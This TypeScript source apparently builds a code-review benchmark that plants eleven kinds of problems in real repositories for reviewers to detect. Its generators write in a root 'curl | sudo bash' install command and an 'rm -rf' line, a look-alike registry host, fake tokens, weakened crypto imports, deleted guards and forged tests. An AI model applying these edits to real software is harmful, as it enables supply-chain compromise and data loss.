import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join, posix } from "node:path";
import { z } from "zod";
import { CaseRecord, type CaseRecord as Case } from "../../pr-replay/schema.ts";
import { leakageChecks } from "../../pr-replay/prepare.ts";
import { git as gitRun, run } from "../../pr-replay/providers.ts";
import { FULL_TEST_RESULTS } from "./config.ts";
import { gitHunks, proximityTarget, type TargetUnit } from "./key-transfer.ts";
import {
  changedBaseLines,
  changedHeadLines,
  checkKind,
  GENERATED_MARKER,
  lightShapeProblem,
  plantCommit,
  plantFiles,
  type LightKind,
} from "./planted.ts";

/**
 * The units-per-call benchmark's set B (12.33, 12.34; NEU-148): problems planted in light files of
 * large real reviews. Each variant is one host case of the parity sample with 16 or more units, and
 * one commit on the host's first-revision head that plants one problem in a light file, so the
 * variant's range is the host's base to the planted commit: the host's own change plus the plant.
 *
 * Eleven problem kinds, ported from the light review's fixtures into realistic edits of real files
 * at each host's head, each placed early, middle or late in a pack of 16 by where its unit falls in
 * code order (directory, path, line), the order a pack is assumed to be cut in. The step's own record
 * of each unit's pack and position is what the scorer reads; the order here only aims the plants.
 *
 * A variant is a case of its own under the `planted` source of the research volume's `cases`: a
 * `case.json` the Modal side reads like any case's, a clone that is a local (hardlinked) copy of the
 * host's replay clone plus the planted commit, checked with the same leakage checks, and an
 * evaluator-only `planted.json` naming the host, the plant's lines and the expected outcome. The
 * plant's own commit looks like an ordinary commit by the host head's author: nothing in the clone
 * says it was planted.
 */

export const PROBLEMS = [
  "lockfile-registry-swap",
  "lockfile-integrity-swap",
  "lockfile-new-dependency",
  "test-weakened",
  "doc-misleads",
  "committed-credential",
  "generated-hand-edit",
  "import-swap",
  "guard-deletion",
  "fixture-hides-failure",
  "public-surface-widened",
] as const;
export type Problem = (typeof PROBLEMS)[number];

export const BUCKETS = ["early", "middle", "late"] as const;
export type Bucket = (typeof BUCKETS)[number];

/** A position in a pack of 16 to its bucket: 1–5 early, 6–11 middle, 12–16 late. */
export const bucketOf = (position: number): Bucket =>
  position <= 5 ? "early" : position <= 11 ? "middle" : "late";

/** Where each problem's light class is decided; credentials take the class of the file they land in. */
const KIND_OF: Readonly<Record<Problem, LightKind | "by-file">> = {
  "lockfile-registry-swap": "light-lockfile",
  "lockfile-integrity-swap": "light-lockfile",
  "lockfile-new-dependency": "light-lockfile",
  "test-weakened": "light-tests",
  "doc-misleads": "light-docs",
  "committed-credential": "by-file",
  "generated-hand-edit": "light-generated",
  "import-swap": "light-import-only",
  "guard-deletion": "light-deletion-only",
  "fixture-hides-failure": "light-fixtures",
  "public-surface-widened": "light-declaration-only",
};

/** The style each problem takes at each bucket, so one kind spans its variants. */
const STYLE: Readonly<Record<Problem, Readonly<Record<Bucket, string>>>> = {
  "lockfile-registry-swap": {
    early: "look-alike registry",
    middle: "look-alike registry",
    late: "look-alike registry",
  },
  "lockfile-integrity-swap": {
    early: "checksum changed",
    middle: "checksum changed",
    late: "checksum changed",
  },
  "lockfile-new-dependency": {
    early: "unexplained new package",
    middle: "unexplained new package",
    late: "unexplained new package",
  },
  "test-weakened": {
    early: "asserts nothing",
    middle: "skipped",
    late: "forged",
  },
  "doc-misleads": {
    early: "harmful command",
    middle: "contradicts the code",
    late: "harmful command",
  },
  "committed-credential": {
    early: "token in a test",
    middle: "token in docs",
    late: "token in a fixture",
  },
  "generated-hand-edit": {
    early: "value changed",
    middle: "value changed",
    late: "value changed",
  },
  "import-swap": {
    early: "weaker module",
    middle: "weaker module",
    late: "weaker module",
  },
  "guard-deletion": {
    early: "check removed",
    middle: "check removed",
    late: "check removed",
  },
  "fixture-hides-failure": {
    early: "expected output blesses a bug",
    middle: "expected output blesses a bug",
    late: "expected output blesses a bug",
  },
  "public-surface-widened": {
    early: "internal module re-exported",
    middle: "type widened to any",
    late: "internal module re-exported",
  },
};

// Deterministic choices: every random-looking value comes from the variant's own seed.

const seeded = (seed: string) => {
  let counter = 0;
  return () => createHash("sha256").update(`${seed}:${counter++}`).digest();
};
const pick = <T>(items: ReadonlyArray<T>, seed: string): T | undefined =>
  items.length === 0
    ? undefined
    : items[seeded(seed)().readUInt32BE(0) % items.length];
const base64Like = (length: number, seed: string) => {
  const next = seeded(seed);
  let out = "";
  while (out.length < length) out += next().toString("base64");
  return out.slice(0, length).replace(/[+/=]/g, "A");
};
const alnum = (length: number, seed: string) => {
  const next = seeded(seed);
  const alphabet =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let out = "";
  while (out.length < length)
    for (const byte of next())
      if (out.length < length) out += alphabet[byte % alphabet.length];
  return out;
};

/** A plant a generator proposes: the file's new text, what names it, and the commit's message. */
export interface Proposal {
  readonly path: string;
  readonly content: string;
  readonly mentions: ReadonlyArray<string>;
  readonly message: string;
  readonly description: string;
}

interface Source {
  readonly path: string;
  readonly text: string;
  readonly seed: string;
  /** Whether the host's own range changes this file (its base and head numbering then differ). */
  readonly inRange: boolean;
}

type Generator = (file: Source, style: string) => Proposal | null;

const lines = (text: string) => text.split("\n");
const join_ = (rows: ReadonlyArray<string>) => rows.join("\n");
const indentOf = (line: string) => /^\s*/.exec(line)![0];

// Lockfiles

const LOCK = /(^|\/)(yarn\.lock|package-lock\.json|pnpm-lock\.yaml|go\.sum)$/;

const registrySwap: Generator = (file) => {
  const rows = lines(file.text);
  const yarn = /^(\s+resolved ")https:\/\/registry\.yarnpkg\.com\/(.+)"$/;
  const npm = /^(\s+"resolved": ")https:\/\/registry\.npmjs\.org\/(.+)",?$/;
  const pnpm = /^(\s+)resolution: \{integrity: ([^}]+)\}$/;
  const at = pick(
    rows.flatMap((row, index) =>
      yarn.test(row) || npm.test(row) || pnpm.test(row) ? [index] : [],
    ),
    file.seed,
  );
  if (at === undefined) return null;
  const row = rows[at]!;
  const host = "registry.npmjs-mirror.org";
  let name = "";
  if (yarn.test(row)) {
    const m = yarn.exec(row)!;
    rows[at] = `${m[1]}https://${host}/${m[2]}"`;
    name = m[2]!.split("/-/")[0]!;
  } else if (npm.test(row)) {
    const m = npm.exec(row)!;
    rows[at] =
      `${m[1]}https://${host}/${m[2]}${row.trimEnd().endsWith(",") ? '",' : '"'}`;
    name = m[2]!.split("/-/")[0]!;
  } else {
    const m = pnpm.exec(row)!;
    const header = rows
      .slice(0, at)
      .reverse()
      .find((r) => /^  '?[^ ].*'?:$/.test(r));
    const spec = (header ?? "").trim().replace(/^'|'?:$/g, "");
    const cut = spec.lastIndexOf("@");
    if (cut <= 0) return null;
    name = spec.slice(0, cut);
    const version = spec.slice(cut + 1);
    const short = name.split("/").at(-1);
    rows[at] =
      `${m[1]}resolution: {integrity: ${m[2]}, tarball: https://${host}/${name}/-/${short}-${version}.tgz}`;
  }
  return {
    path: file.path,
    content: join_(rows),
    mentions: [host, name],
    message: "Refresh lockfile",
    description: `${name} now resolves from ${host}, not the public registry`,
  };
};

const integritySwap: Generator = (file) => {
  const rows = lines(file.text);
  const patterns = [
    /^(\s+integrity sha512-)([A-Za-z0-9+/]+)(==)$/,
    /^(\s+"integrity": "sha512-)([A-Za-z0-9+/]+)(==",?)$/,
    /^(\s+resolution: \{integrity: sha512-)([A-Za-z0-9+/]+)(==\})$/,
    /^(\S+ v\S+(?<!\/go\.mod) h1:)([A-Za-z0-9+/]{43})(=)$/,
  ];
  const at = pick(
    rows.flatMap((row, index) =>
      patterns.some((p) => p.test(row)) && !/\/go\.mod h1:/.test(row)
        ? [index]
        : [],
    ),
    file.seed,
  );
  if (at === undefined) return null;
  const pattern = patterns.find((p) => p.test(rows[at]!))!;
  const m = pattern.exec(rows[at]!)!;
  rows[at] = `${m[1]}${base64Like(m[2]!.length, file.seed)}${m[3]}`;
  // The entry the checksum belongs to: a go.sum line's module; a yarn entry's unindented header; an
  // npm lock's `"name": {`; a pnpm package's two-space header.
  const header = /\.sum$/.test(file.path)
    ? rows[at]!
    : (rows
        .slice(0, at)
        .reverse()
        .find(
          (r) =>
            /^[^\s#]/.test(r) ||
            /^    "[^"]+": \{$/.test(r) ||
            /^  '?[^\s'][^:]*'?:$/.test(r),
        ) ?? "");
  const owner = /\.sum$/.test(file.path)
    ? header.split(" ")[0]!
    : header
        .trim()
        .replace(/^"|"?: \{$|:$/g, "")
        .split(", ")[0]!
        .replace(/^['"]|['"]$/g, "")
        .replace(/(.)@[^@]*$/, "$1");
  return {
    path: file.path,
    content: join_(rows),
    mentions: [owner],
    message: "Update lockfile after a clean install",
    description: `the checksum of ${owner} changed with no version change`,
  };
};

const newDependency: Generator = (file) => {
  const rows = lines(file.text);
  if (/go\.sum$/.test(file.path)) {
    const modules = [
      ...new Set(
        rows
          .map((r) => /^(github\.com\/[\w.-]+\/[\w.-]+) /.exec(r)?.[1])
          .filter((m): m is string => m !== undefined),
      ),
    ];
    const like = pick(modules, file.seed);
    if (like === undefined) return null;
    const [, owner, repo] = like.split("/");
    const added = `github.com/${owner}-dev/${repo}-x`;
    const entry = [
      `${added} v0.4.1 h1:${base64Like(43, `${file.seed}:a`)}=`,
      `${added} v0.4.1/go.mod h1:${base64Like(43, `${file.seed}:b`)}=`,
    ];
    const at = rows.findIndex((r) => r > entry[0]! && r.trim() !== "");
    rows.splice(at === -1 ? rows.length : at, 0, ...entry);
    return {
      path: file.path,
      content: join_(rows),
      mentions: [added],
      message: "Tidy module checksums",
      description: `go.sum gains ${added}, which no go.mod requires and resembles ${like}`,
    };
  }
  if (!/yarn\.lock$/.test(file.path)) return null;
  // A yarn entry with dependencies gains one more, and the new package's own entry is added.
  const blocks = rows.flatMap((row, index) =>
    row === "  dependencies:" ? [index] : [],
  );
  const at = pick(blocks, file.seed);
  if (at === undefined) return null;
  const firstDep = /^    "?([^"\s]+)"? /.exec(rows[at + 1] ?? "")?.[1];
  if (firstDep === undefined) return null;
  const added = `${firstDep.replace(/^@/, "").replace(/\//g, "-")}-helpers`;
  let end = at + 1;
  while (/^    /.test(rows[end] ?? "")) end++;
  const deps = rows.slice(at + 1, end);
  deps.push(`    ${added} "^2.0.1"`);
  deps.sort((a, b) =>
    a.trim().replace(/"/g, "").localeCompare(b.trim().replace(/"/g, "")),
  );
  rows.splice(at + 1, end - at - 1, ...deps);
  const entry = [
    `${added}@^2.0.1:`,
    `  version "2.0.1"`,
    `  resolved "https://registry.yarnpkg.com/${added}/-/${added}-2.0.1.tgz#${createHash("sha1").update(file.seed).digest("hex")}"`,
    `  integrity sha512-${base64Like(86, file.seed)}==`,
    "",
  ];
  const before = rows.findIndex(
    (r) => /^[^\s#]/.test(r) && r.replace(/"/g, "") > `${added}@`,
  );
  rows.splice(before === -1 ? rows.length : before, 0, ...entry);
  return {
    path: file.path,
    content: join_(rows),
    mentions: [added],
    message: "Update dependencies",
    description: `a new package, ${added}, enters the lockfile as a dependency of an existing one, with no manifest asking for it`,
  };
};

// Tests

const JS_TEST =
  /\.(test|spec)\.[jt]sx?$|-test\.[jt]sx?$|\/__tests__\/[^/]+\.[jt]sx?$/;
const GO_TEST = /_test\.go$/;

/** A JS test block: its opening line and the line that closes it, by indentation. */
const jsTests = (rows: ReadonlyArray<string>) =>
  rows.flatMap((row, index) => {
    if (
      !/^\s*(it|test)\((['"`]).+,\s*(async\s*)?(\(\)|function\s*\(\))/.test(row)
    )
      return [];
    const indent = indentOf(row);
    const end = rows.findIndex(
      (r, j) =>
        j > index &&
        indentOf(r) === indent &&
        /^\s*\}\)?;?\s*$|^\s*\}\);/.test(r),
    );
    return end === -1 ? [] : [{ start: index, end }];
  });

const goTests = (rows: ReadonlyArray<string>) =>
  rows.flatMap((row, index) => {
    if (!/^func Test\w+\(t \*testing\.T\) \{$/.test(row)) return [];
    const end = rows.findIndex((r, j) => j > index && r === "}");
    return end === -1 ? [] : [{ start: index, end }];
  });

const testWeakened: Generator = (file, style) => {
  const rows = lines(file.text);
  const go = GO_TEST.test(file.path);
  if (!go && !JS_TEST.test(file.path)) return null;
  const blocks = go ? goTests(rows) : jsTests(rows);
  const named = (start: number) =>
    go
      ? /^func (Test\w+)/.exec(rows[start]!)![1]!
      : (/\((['"`])(.+?)\1/.exec(rows[start]!)?.[2] ?? "");
  if (style === "skipped") {
    const block = pick(blocks, file.seed);
    if (block === undefined) return null;
    const name = named(block.start);
    if (go)
      rows.splice(
        block.start + 1,
        0,
        `\tt.Skip("flaky on CI; tracked separately")`,
      );
    else
      rows[block.start] = rows[block.start]!.replace(
        /^(\s*)(it|test)\(/,
        "$1$2.skip(",
      );
    return {
      path: file.path,
      content: join_(rows),
      mentions: [name],
      message: "Skip a flaky test",
      description: `the test "${name}" no longer runs`,
    };
  }
  if (style === "asserts nothing") {
    const assertion = go
      ? /^\s*t\.(Errorf|Fatalf|Error|Fatal)\(/
      : /^\s*expect\(.*\);?\s*$/;
    const usable = blocks.filter(
      (b) =>
        rows.slice(b.start, b.end).filter((r) => assertion.test(r)).length >= 2,
    );
    const block = pick(usable, file.seed);
    if (block === undefined) return null;
    const name = named(block.start);
    for (let i = block.start; i < block.end; i++)
      if (assertion.test(rows[i]!))
        rows[i] = go
          ? rows[i]!.replace(
              /t\.(Errorf|Fatalf|Error|Fatal)\(/,
              (_, f: string) => (f.endsWith("f") ? "t.Logf(" : "t.Log("),
            )
          : `${indentOf(rows[i]!)}// ${rows[i]!.trim()}`;
    return {
      path: file.path,
      content: join_(rows),
      mentions: [name],
      message: go
        ? "Log test mismatches instead of failing"
        : "Quiet noisy assertions",
      description: `the test "${name}" still runs but can no longer fail`,
    };
  }
  // Forged: the expectation compares the result with itself.
  const forged = go
    ? /^(\s*if )(got|have|actual)( != )(want|expected|exp)( \{)$/
    : /^(\s*expect\()([\w$.[\]'"]+)(\)\.(?:toBe|toEqual|toStrictEqual)\()(.+)(\);?)$/;
  const usable = blocks.flatMap((b) =>
    rows
      .slice(b.start, b.end)
      .flatMap((r, j) =>
        forged.test(r) ? [{ block: b, at: b.start + j }] : [],
      ),
  );
  const chosen = pick(usable, file.seed);
  if (chosen === undefined) return null;
  const m = forged.exec(rows[chosen.at]!)!;
  rows[chosen.at] = `${m[1]}${m[2]}${m[3]}${m[2]}${m[5]}`;
  const name = named(chosen.block.start);
  return {
    path: file.path,
    content: join_(rows),
    mentions: [name],
    message: "Fix test expectation",
    description: `the test "${name}" compares ${m[2]} with itself`,
  };
};

// Docs

const DOC = /\.(md|mdx)$/i;

const docMisleads: Generator = (file, style) => {
  if (!DOC.test(file.path) || /CHANGELOG|LICENSE/i.test(file.path)) return null;
  const rows = lines(file.text);
  if (style === "contradicts the code") {
    // Only the stated default's value changes: the rest of the line keeps the code's word.
    const claim =
      /(\b(?:defaults? (?:to|is)|by default,? is|default:)\s*`?)(true|false|\d+)(`?)/i;
    const claims = rows.flatMap((row, index) =>
      claim.test(row) ? [index] : [],
    );
    const at = pick(claims, file.seed);
    if (at === undefined) return null;
    const before = rows[at]!;
    const after = before.replace(
      claim,
      (_, lead: string, value: string, tail: string) =>
        `${lead}${value === "true" ? "false" : value === "false" ? "true" : String(Number(value) * 10)}${tail}`,
    );
    if (after === before) return null;
    rows[at] = after;
    return {
      path: file.path,
      content: join_(rows),
      mentions: [after.trim().slice(0, 60)],
      message: "Clarify defaults in the docs",
      description: "a documented default no longer matches the code",
    };
  }
  const heading = rows.findIndex((r) => /^#{1,3} /.test(r));
  if (heading === -1) return null;
  let at = rows.findIndex((r, j) => j > heading + 1 && r.trim() === "");
  if (at === -1) at = rows.length;
  const tool = posix.basename(posix.dirname(file.path)) || "the toolchain";
  rows.splice(
    at,
    0,
    "",
    "### If the build fails",
    "",
    `A permissions error while building ${tool} usually means a stale global install. Clear it and reinstall the toolchain:`,
    "",
    "```sh",
    "sudo rm -rf /usr/local/lib/node_modules ~/.cache",
    "curl -fsSL https://get-devtools.sh/install | sudo bash",
    "```",
  );
  return {
    path: file.path,
    content: join_(rows),
    mentions: [
      "curl -fsSL https://get-devtools.sh/install | sudo bash",
      "sudo rm -rf",
    ],
    message: "Document a build fix",
    description:
      "the docs tell readers to delete system folders and pipe a remote script into a root shell",
  };
};

// Credentials

const credential: Generator = (file, style) => {
  const token = `ghp_${alnum(36, file.seed)}`;
  const rows = lines(file.text);
  if (style === "token in docs") {
    if (!DOC.test(file.path)) return null;
    const fence = rows.findIndex((r) => /^```(sh|bash|shell|console)$/.test(r));
    if (fence !== -1) rows.splice(fence + 1, 0, `export GITHUB_TOKEN=${token}`);
    else {
      const heading = rows.findIndex((r) => /^#{1,3} /.test(r));
      if (heading === -1) return null;
      let at = rows.findIndex((r, j) => j > heading + 1 && r.trim() === "");
      if (at === -1) at = rows.length;
      rows.splice(
        at,
        0,
        "",
        "To try it against the shared test organisation, use the release bot's token:",
        "",
        "```sh",
        `export GITHUB_TOKEN=${token}`,
        "```",
      );
    }
  } else if (GO_TEST.test(file.path) || /\.go$/.test(file.path)) {
    if (style !== "token in a test" || !GO_TEST.test(file.path)) return null;
    const imports = rows.findIndex((r) => r === ")");
    const at =
      imports === -1
        ? rows.findIndex((r) => /^package /.test(r)) + 1
        : imports + 1;
    rows.splice(
      at,
      0,
      "",
      `// ciToken reads the release bot's repositories in integration runs.`,
      `const ciToken = "${token}"`,
    );
  } else if (style === "token in a test" && JS_TEST.test(file.path)) {
    const last = rows.reduce(
      (found, r, i) => (/^import |^const .*require\(/.test(r) ? i : found),
      -1,
    );
    rows.splice(
      last + 1,
      0,
      "",
      "// The release bot's token, for the integration fixtures.",
      `const GITHUB_TOKEN = '${token}';`,
    );
  } else if (style === "token in a fixture" && /\.json$/.test(file.path)) {
    const open = rows.findIndex((r) => /^\s*\{\s*$/.test(r));
    if (open === -1 || !/^\s*"/.test(rows[open + 1] ?? "")) return null;
    rows.splice(
      open + 1,
      0,
      `${indentOf(rows[open + 1]!)}"token": "${token}",`,
    );
  } else if (style === "token in a fixture" && /\.ya?ml$/.test(file.path)) {
    const top = rows.findIndex((r) => /^[A-Za-z_][\w-]*:/.test(r));
    if (top === -1) return null;
    rows.splice(top, 0, `token: ${token}`);
  } else if (
    style === "token in a fixture" &&
    /(^|\/)\.env[\w.-]*$/.test(file.path)
  ) {
    rows.splice(0, 0, `GITHUB_TOKEN=${token}`);
  } else return null;
  return {
    path: file.path,
    content: join_(rows),
    mentions: ["ghp_", token.slice(0, 10)],
    message:
      style === "token in docs"
        ? "Document the release setup"
        : "Set up integration fixtures",
    description: "a GitHub personal access token is committed",
  };
};

// Generated files

const generatedEdit: Generator = (file) => {
  const rows = lines(file.text);
  if (!GENERATED_MARKER.test(rows.slice(0, 12).join("\n"))) return null;
  const candidates = rows.flatMap((row, index) =>
    index > 12 &&
    !/^\s*(\/\/|#|\*)/.test(row) &&
    // stringer's `_ = x[A-1]` lines make the build fail when edited: a compiler, not a reviewer, catches that.
    !/^\s*_ = x\[/.test(row) &&
    (/\b(true|false)\b/.test(row) || /\b\d{2,}\b/.test(row))
      ? [index]
      : [],
  );
  const at = pick(candidates, file.seed);
  if (at === undefined) return null;
  const before = rows[at]!;
  const after = /\btrue\b/.test(before)
    ? before.replace(/\btrue\b/, "false")
    : /\bfalse\b/.test(before)
      ? before.replace(/\bfalse\b/, "true")
      : before.replace(/\b(\d{2,})\b/, (n) => String(Number(n) + 1));
  rows[at] = after;
  return {
    path: file.path,
    content: join_(rows),
    mentions: [posix.basename(file.path)],
    message: "Fix a value in the table",
    description:
      "a hand edit inside a generated file, which the next regeneration will undo or which no longer matches its source",
  };
};

// Imports

const SWAPS: ReadonlyArray<{
  from: string;
  to: string;
  name: string;
  allowed: RegExp;
}> = [
  { from: "crypto/rand", to: "math/rand", name: "rand", allowed: /^Read$/ },
  {
    from: "html/template",
    to: "text/template",
    name: "template",
    allowed:
      /^(New|Must|ParseFiles|ParseGlob|ParseFS|Template|FuncMap|HTMLEscapeString|HTMLEscaper|JSEscapeString|JSEscaper|URLQueryEscaper|IsTrue)$/,
  },
];

const importSwap: Generator = (file) => {
  if (!/\.go$/.test(file.path) || GO_TEST.test(file.path)) return null;
  const rows = lines(file.text);
  for (const swap of SWAPS) {
    const at = rows.findIndex((r) => r.trim() === `"${swap.from}"`);
    if (at === -1) continue;
    const uses = [
      ...file.text.matchAll(new RegExp(`\\b${swap.name}\\.(\\w+)`, "g")),
    ].map((m) => m[1]!);
    if (uses.length === 0 || uses.some((use) => !swap.allowed.test(use)))
      continue;
    if (rows.some((r) => r.trim() === `"${swap.to}"`)) continue;
    // Kept sorted within its group, as gofmt keeps it.
    let start = at;
    while (start > 0 && /^\t"/.test(rows[start - 1]!)) start--;
    let end = at;
    while (/^\t"/.test(rows[end + 1] ?? "")) end++;
    const group = rows
      .slice(start, end + 1)
      .map((r) => (r.trim() === `"${swap.from}"` ? `\t"${swap.to}"` : r));
    group.sort();
    rows.splice(start, end - start + 1, ...group);
    return {
      path: file.path,
      content: join_(rows),
      mentions: [swap.to],
      message: "Simplify imports",
      description: `${swap.from} is swapped for ${swap.to}, which keeps the code compiling and loses its guarantee`,
    };
  }
  return null;
};

// Deleted guards

const guardDeletion: Generator = (file) => {
  // Base and head number the file alike only when the host's own range leaves it alone.
  if (file.inRange) return null;
  const rows = lines(file.text);
  const go = /\.go$/.test(file.path);
  if (
    go
      ? GO_TEST.test(file.path)
      : !/\.[jt]sx?$/.test(file.path) || JS_TEST.test(file.path)
  )
    return null;
  const guards = rows.flatMap((row, index) => {
    const body = rows[index + 1] ?? "";
    const close = rows[index + 2] ?? "";
    if (go) {
      const m = /^\s*if (.+) \{$/.exec(row);
      if (m === null || /\berr\b|:=|== nil|!= nil|test/i.test(m[1]!)) return [];
      if (!/^\s*return\b.*(fmt\.Errorf|errors\.New|\berr[A-Z]\w*)/.test(body))
        return [];
      if (close.trim() !== "}") return [];
      return [index];
    }
    const m = /^\s*if \((.+)\) \{$/.exec(row);
    if (
      m === null ||
      !/^\s*(throw new \w*Error\(|return\b)/.test(body) ||
      close.trim() !== "}"
    )
      return [];
    // A null check narrows a type, so the type checker catches its removal; a test-only flag guards nothing.
    if (/^!?[\w$.]+$|[=!]==? ?(null|undefined)\b|test/i.test(m[1]!.trim()))
      return [];
    return [index];
  });
  const at = pick(guards, file.seed);
  if (at === undefined) return null;
  const guard = rows[at]!.trim();
  rows.splice(at, 3);
  return {
    path: file.path,
    content: join_(rows),
    mentions: [guard.slice(0, 60)],
    message: "Remove a redundant check",
    description: `the check "${guard}" and what it rejects are gone`,
  };
};

// Fixtures

const FIXTURE =
  /((^|\/)(fixtures?|__fixtures__|testdata|__snapshots__)\/|\.expect\.md$|\.snap$|\.golden$)/;

const fixtureHides: Generator = (file) => {
  if (
    !FIXTURE.test(file.path) ||
    /\.(png|jpe?g|gif|wasm|zip|gz)$/.test(file.path)
  )
    return null;
  const rows = lines(file.text);
  // An `.expect.md` repeats its input: only its output sections are what the fixture expects.
  const from = /\.expect\.md$/.test(file.path)
    ? rows.findIndex((r) => /^## Code$|^### Eval output$/.test(r))
    : 3;
  if (from === -1) return null;
  const candidates = rows.flatMap((row, index) =>
    index > from &&
    (/!==|===/.test(row) ||
      /\b(true|false)\b/.test(row) ||
      /\b\d{2,}\b/.test(row))
      ? [index]
      : [],
  );
  const at = pick(candidates, file.seed);
  if (at === undefined) return null;
  const before = rows[at]!;
  const after = /!==/.test(before)
    ? before.replace("!==", "===")
    : /===/.test(before)
      ? before.replace("===", "!==")
      : /\btrue\b/.test(before)
        ? before.replace(/\btrue\b/, "false")
        : /\bfalse\b/.test(before)
          ? before.replace(/\bfalse\b/, "true")
          : before.replace(/\b(\d{2,})\b/, (n) => String(Number(n) + 1));
  rows[at] = after;
  return {
    path: file.path,
    content: join_(rows),
    mentions: [posix.basename(file.path), after.trim().slice(0, 50)],
    message: "Update expected output",
    description:
      "the expected output now records the wrong result, so a test passes on broken behaviour",
  };
};

// Public surface

const publicSurface =
  (siblings: (path: string) => ReadonlyArray<string>): Generator =>
  (file, style) => {
    const rows = lines(file.text);
    if (style === "type widened to any") {
      if (!/\.(ts|tsx|js)$/.test(file.path) || JS_TEST.test(file.path))
        return null;
      const unions = rows.flatMap((row, index) =>
        /^export type \w+ =( '[^']+'| "[^"]+")( \| ('[^']+'|"[^"]+"))+;$/.test(
          row,
        )
          ? [index]
          : [],
      );
      const at = pick(unions, file.seed);
      if (at === undefined) return null;
      const name = /^export type (\w+)/.exec(rows[at]!)![1]!;
      rows[at] = `export type ${name} = string;`;
      return {
        path: file.path,
        content: join_(rows),
        mentions: [name],
        message: "Loosen a type",
        description: `the exported type ${name} widens from a closed set of names to any string`,
      };
    }
    if (!/(^|\/)index\.[jt]s$/.test(file.path)) return null;
    const exports = rows.flatMap((row, index) =>
      /^export .* from '\.\/[^']+';$|^export .* from "\.\/[^"]+";$/.test(row)
        ? [index]
        : [],
    );
    if (exports.length === 0) return null;
    const named = new Set(
      rows.map((r) => /from ['"]\.\/([^'"]+)['"]/.exec(r)?.[1]).filter(Boolean),
    );
    const internal = pick(
      siblings(file.path)
        .map((p) => posix.basename(p).replace(/\.[jt]sx?$/, ""))
        .filter(
          (n) => n !== "index" && !named.has(n) && !/test|spec|^__/.test(n),
        ),
      file.seed,
    );
    if (internal === undefined) return null;
    const last = rows[exports.at(-1)!]!;
    const quote = last.includes('"') ? '"' : "'";
    const extension = /\.(ts|js)['"];$/.exec(last)?.[0].slice(0, -2) ?? "";
    rows.splice(
      exports.at(-1)! + 1,
      0,
      `export * from ${quote}./${internal}${extension}${quote};`,
    );
    return {
      path: file.path,
      content: join_(rows),
      mentions: [internal],
      message: "Export the remaining helpers",
      description: `the package entry now re-exports every name of its internal module ${internal}`,
    };
  };

// Hosts

/** A host case: its record, clone, range and today's units in code order. */
export interface Host {
  readonly caseId: string;
  readonly source: string;
  readonly number: number;
  readonly directory: string;
  readonly replay: string;
  readonly record: Case;
  readonly files: ReadonlyArray<string>;
  readonly rangeFiles: ReadonlySet<string>;
  readonly units: ReadonlyArray<UnitKey>;
}

/** A unit's place in code order: directory, path, first line. */
export interface UnitKey {
  readonly unit: string;
  readonly dir: string;
  readonly path: string;
  readonly line: number;
}

const unitKey = (unit: TargetUnit): UnitKey => {
  const keys = [...unit.lines];
  const path = keys[0]!.replace(/:(new|old):(\d+|whole)$/, "");
  const numbers = keys
    .map((k) => /:(\d+)$/.exec(k)?.[1])
    .filter((n): n is string => n !== undefined)
    .map(Number);
  return {
    unit: unit.unit,
    dir: posix.dirname(path),
    path,
    line: numbers.length === 0 ? 0 : Math.min(...numbers),
  };
};

const before = (a: UnitKey, b: { dir: string; path: string; line: number }) =>
  a.dir < b.dir ||
  (a.dir === b.dir &&
    (a.path < b.path || (a.path === b.path && a.line < b.line)));

export const unitsInOrder = (units: ReadonlyArray<TargetUnit>) =>
  units.map(unitKey).sort((a, b) => (before(a, b) ? -1 : before(b, a) ? 1 : 0));

export const readHost = (casesRoot: string, caseKey: string): Host => {
  const [source, number] = caseKey.split("/");
  const directory = join(casesRoot, source!, number!);
  const record = CaseRecord.parse(
    JSON.parse(readFileSync(join(directory, "case.json"), "utf8")),
  );
  const replay = join(directory, "replay");
  const first = record.firstRevision!;
  const hunks = gitHunks(replay, `${first.base}..${first.head}`);
  return {
    caseId: record.caseId,
    source: source!,
    number: Number(number),
    directory,
    replay,
    record,
    files: gitRun(replay, ["ls-tree", "-r", "--name-only", first.head])
      .stdout.split("\n")
      .filter(Boolean),
    rangeFiles: new Set(hunks.map((h) => h.newPath ?? h.path)),
    units: unitsInOrder(proximityTarget(record.caseId, hunks)),
  };
};

/** Where a new unit at (path, line) would sit among the host's units, and its place in a pack of 16. */
export const aimedPosition = (host: Host, path: string, line: number) => {
  const key = { dir: posix.dirname(path), path, line };
  const rank = host.units.filter((u) => before(u, key)).length + 1;
  return {
    rank,
    units: host.units.length + 1,
    position: ((rank - 1) % 16) + 1,
  };
};

const firstChangedLine = (a: string, b: string) => {
  const x = lines(a);
  const y = lines(b);
  let i = 0;
  while (i < x.length && i < y.length && x[i] === y[i]) i++;
  return i + 1;
};

/** Files near the change first: those the range touches, then by shared directory depth. */
const nearness = (host: Host, path: string) => {
  if (host.rangeFiles.has(path)) return 1_000;
  const parts = path.split("/");
  let best = 0;
  for (const other of host.rangeFiles) {
    const o = other.split("/");
    let shared = 0;
    while (shared < parts.length - 1 && parts[shared] === o[shared]) shared++;
    best = Math.max(best, shared);
  }
  return best;
};

const PREDICATE: Readonly<Record<Problem, (path: string) => boolean>> = {
  "lockfile-registry-swap": (p) => LOCK.test(p) && !/go\.sum$/.test(p),
  "lockfile-integrity-swap": (p) => LOCK.test(p),
  "lockfile-new-dependency": (p) => /(^|\/)(yarn\.lock|go\.sum)$/.test(p),
  "test-weakened": (p) => JS_TEST.test(p) || GO_TEST.test(p),
  "doc-misleads": (p) => DOC.test(p) && !FIXTURE.test(p),
  "committed-credential": (p) =>
    JS_TEST.test(p) ||
    GO_TEST.test(p) ||
    (DOC.test(p) && !FIXTURE.test(p)) ||
    (FIXTURE.test(p) &&
      /(\.json|\.ya?ml|(^|\/)\.env[\w.-]*)$/.test(p) &&
      !/(^|\/)(tsconfig|package|jsconfig|manifest)[^/]*\.json$|(^|\/)\.\w+rc(\.json)?$/.test(
        p,
      )),
  "generated-hand-edit": (p) => /\.(go|js|ts)$/.test(p),
  "import-swap": (p) => /\.go$/.test(p) && !GO_TEST.test(p),
  "guard-deletion": (p) =>
    /\.(go|[jt]sx?)$/.test(p) &&
    !GO_TEST.test(p) &&
    !JS_TEST.test(p) &&
    !FIXTURE.test(p) &&
    !/(^|\/)(__tests__|tests?|e2e)\//.test(p),
  // Expected outputs only: a fixture's input or config is not where a failure hides.
  "fixture-hides-failure": (p) =>
    /\.expect\.md$|\.snap$|\.golden$/.test(p) ||
    (FIXTURE.test(p) &&
